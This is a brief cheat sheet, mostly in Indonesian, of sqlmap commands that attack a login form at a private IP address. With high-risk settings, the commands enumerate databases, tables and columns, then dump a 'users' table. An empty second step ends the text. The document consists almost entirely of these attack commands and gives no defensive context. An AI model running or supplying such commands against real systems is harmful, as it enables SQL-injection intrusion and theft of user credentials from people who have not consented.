# sqlmap show database tabel colum #

1.Temukan Struktur Database:

````
sqlmap -u "http://192.168.1.2/pe/index.php" --data="username=admin&password=admin" --batch --risk=3 --level=5 --dbs   
sqlmap -u "http://192.168.1.2/pe/index.php" --data="username=admin&password=admin" --batch --risk=3 --level=5 -D testdb --tables   
sqlmap -u "http://192.168.1.2/pe/index.php" --data="username=admin&password=admin" --batch --risk=3 --level=5 -D testdb -T users --columns
sqlmap -u "http://192.168.1.2/pe/index.php" --data="username=admin&password=admin" --batch --risk=3 --level=5 -D testdb -T users --dump       

````
2.
